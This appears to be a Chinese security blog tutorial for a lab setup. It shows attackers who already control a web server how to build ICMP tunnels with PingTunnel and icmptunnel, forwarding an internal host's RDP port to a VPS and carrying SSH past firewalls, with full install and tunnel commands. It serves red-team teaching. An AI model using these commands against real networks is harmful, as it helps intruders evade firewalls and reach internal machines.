**目录**

[ICMP隧道](#t0 "ICMP隧道")

[使用ICMP搭建隧道(PingTunnel)](#t1 "使用ICMP搭建隧道(PingTunnel)")

[使用ICMP搭建隧道(Icmptunnel)](#t2 "使用ICMP搭建隧道(Icmptunnel)")

* * *

ICMP隧道
------

ICMP隧道简单实用，是一个比较特殊的协议。在一般的[通信协议](https://so.csdn.net/so/search?q=%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020)里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ping命令就是利用的ICMP协议，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相应的回复与请求。

在一些网络环境中，如果攻击者使用各类上层隧道(例如：HTTP隧道、DNS隧道、常规正/反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙(防火墙一般不会屏蔽ping的数据包)，实现不受限制的访问访问。

### 使用ICMP搭建隧道(PingTunnel)

PingTunnel是一款常用的ICMP隧道工具，可以跨平台使用，为了避免隧道被滥用，还可以为隧道设置密码。

**拓扑图如下：**

192.168.10.X 模拟公网地址，Web服务器模拟企业对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网存在一台WIndows机器，Web服务器可以与该机器连接。现在我们获取到了Web服务器的权限，想用ICMP搭建通往内网的隧道，连接内网Windows的3389端口。

![](https://img-blog.csdnimg.cn/20200219214559843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**PingTunnel的安装**

```
#安装libpcap的依赖环境      
yum -y install byacc      
yum -y install flex bison       
#安装libpcap依赖库      
wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz      
tar -xzvf libpcap-1.9.0.tar.gz      
cd libpcap-1.9.0      
./configure      1
make && make install       1
#安装PingTunnel      1
wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz      1
tar -xzvf PingTunnel-0.72.tar.gz      1
cd PingTunnel      1
make && make install
```


**在Web服务器的操作**

```
ptunnel -x shuteer     #-x 指定连接密码
```


### ![](https://img-blog.csdnimg.cn/2020021921362925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**VPS的操作**

```
ptunnel -p 192.168.10.129 -lp 1080 -da 10.10.10.10 -dp 3389 -x shuteer      
    -p 指定ICMP隧道另一端的IP      
    -lp：指定本地监听的端口      
    -da：指定要转发的目标机器的IP      
    -dp：指定要转发的目标机器的端口      
    -x：指定连接密码
```


![](https://img-blog.csdnimg.cn/20200219213717446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们只需要远程连接192.168.10.129的1080端口就相当于连接了10.10.10.10的3389端口了。

![](https://img-blog.csdnimg.cn/20200219213811403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200219213951230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 使用ICMP搭建隧道(Icmptunnel)

适用场景：目标机器是Linux服务器的情况

*   攻击机：Redhat7  192.1.68.10.20
*   靶机：Centos7  192.168.10.13

ICMP隧道是指将TCP连接通过ICMP包进行隧道传送的一种方法。

icmptunnel是一个将IP流量封装到 ICMP echo请求和回复（ping）包中的隧道工具，是在允许 ping 的网络中进行拓展、绕过防火墙的一种半隐蔽方式。虽然ICMP echo流量在网络边界通常会被过滤，但这种方法仍然可能对从企业内网出连到互联网的技术有一定帮助。

**icmptunnel的安装**

分别在服务端和客户端安装 icmptunnel，安装过程如下

```
git clone https://github.com/jamesbarlow/icmptunnel.git      
make
```


![](https://img-blog.csdnimg.cn/20200219193922818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**服务端的操作：**

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all      #禁用icmp回复      
./icmptunnel -s                                       #监听      
重新打开一个命令行窗口      
ifconfig tun0 10.0.0.1 netmask 255.255.255.0          #添加tun0网卡，分配隧道地址10.0.0.1/24
```


![](https://img-blog.csdnimg.cn/20190823144336426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2019082314425743.png)

**客户端的操作：**

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all      #禁用icmp回复      
./icmptunnel 192.168.10.20                            #连接服务端      
重新打开一个命令行窗口      
ifconfig tun0 10.0.0.2 netmask 255.255.255.0          #添加tun0网卡，分配隧道地址10.0.0.2/24
```


![](https://img-blog.csdnimg.cn/20190823144414930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190823144433595.png)

至此，客户端和服务端已经打通了一条ICMP隧道。

![](https://img-blog.csdnimg.cn/20190823144710706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

接下来，在客户端和服务端分别用隧道的ip地址进行SSH连接。

![](https://img-blog.csdnimg.cn/20190823144509737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190823144532292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)